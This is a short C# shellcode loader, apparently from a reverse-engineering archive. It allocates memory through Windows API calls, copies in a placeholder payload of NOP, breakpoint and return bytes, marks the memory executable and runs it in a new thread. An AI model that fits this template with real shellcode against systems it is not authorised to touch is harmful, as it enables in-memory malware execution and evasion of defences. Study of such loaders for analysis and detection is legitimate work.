/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in stack
    using P/Invoke for accessing windows API

Compile
    $ csc code.cs

Technique:
    - allocation: VirtualAlloc
    - writing:    Marshal.Copy
    - permission: VirtualProtect
    - execution:  CreateThread
*/

using System;
using System.Runtime.InteropServices;

namespace ReversingID
{
    class ShellcodeLoader
    {
        public static void Main (string[] args)
        {
            IntPtr runtime;

            IntPtr th_shellcode = IntPtr.Zero;
            uint   thread_id = 0;
            uint   old_protect = 0;

            // shellcode storage in stack
            byte[] payload = new byte[4]{ 0x90, 0x90, 0xCC, 0xC3 };

            // allocate memory buffer for payload as READ-WRITE (no executable)
            runtime = VirtualAlloc (IntPtr.Zero, (uint)payload.Length, (uint)(State.MEM_COMMIT | State.MEM_RESERVE), (uint)Protection.PAGE_READWRITE);

            // copy payload to the buffer
            Marshal.Copy (payload, 0, runtime, payload.Length);

            VirtualProtect (runtime, (uint)payload.Length, (uint)Protection.PAGE_EXECUTE_READ, ref old_protect);

            // make buffer executable
            th_shellcode = CreateThread (0, 0, runtime, IntPtr.Zero, 0, ref thread_id);
            WaitForSingleObject (th_shellcode, 0xffffffff);

            VirtualFree (runtime, payload.Length, (int)State.MEM_RELEASE);
        }
        
        public enum State
        {
            MEM_COMMIT  = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_RELEASE = 0x8000,
            MEM_FREE    = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }


        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc (
            IntPtr address, 
            uint size, 
            uint alloc_type, 
            uint protection);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualFree (
            IntPtr lpAddress, 
            int dwSize, 
            int dwFreeType);

        [DllImport("kernel32.dll")]
        private static extern bool   VirtualProtect (
            IntPtr address, 
            uint size, 
            uint protection, 
            ref uint old_protection);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread (
            uint attrs, 
            uint stack_size, 
            IntPtr start_addr, 
            IntPtr param, 
            uint creation_flag, 
            ref uint thread_id);

        [DllImport("kernel32.dll")]
        private static extern uint   WaitForSingleObject (IntPtr handle, uint ms);
    }
}